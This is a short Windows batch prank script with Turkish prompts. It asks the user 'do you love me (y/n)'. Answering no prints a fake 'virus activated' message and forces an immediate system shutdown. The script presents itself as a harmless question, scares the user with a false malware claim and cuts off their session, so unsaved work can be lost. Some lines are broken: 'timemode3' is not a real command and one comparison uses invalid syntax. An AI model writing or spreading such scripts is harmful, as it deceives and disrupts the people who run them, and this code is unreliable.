@echo
:x
color a
echo beni seviyor musun (e/h):
set /p input=
if /i %input%==e goto y
if /i %input%==h goto z
if /i not %input%==e,h goto y
:y
echo bende seni...
pause
exit
:z
echo virüs aktivleştirildi...
timemode3
shutdown -s -t 0
